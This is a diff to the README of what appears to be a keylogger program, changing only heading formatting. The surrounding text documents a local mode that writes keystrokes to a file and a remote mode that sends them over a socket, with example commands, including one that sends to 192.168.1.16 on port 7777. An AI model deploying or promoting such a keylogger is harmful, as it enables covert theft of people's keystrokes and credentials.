@@ -12,7 +12,7 @@ run command make
 
 This program propose 2 types of keylogger
 
-##REQUIERED Parameters : Please, choose one of them
+## [REQUIERED] Parameters : Please, choose one of them
 
         -l | --local : local keylogger, store data into file on this computer, require 1 argument (destination path)
                 Example : ./bin/main.exe -l D:\file.txt
@@ -20,7 +20,7 @@ This program propose 2 types of keylogger
         -r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)
                 Example : ./bin/main.exe -r 192.168.1.16 7777
 
-##OPTIONAL Options
+## [OPTIONAL] Options
 
         -c | --no_click : don't store click keys (based on ascii)
                 Example : ./bin/main.exe ... -c
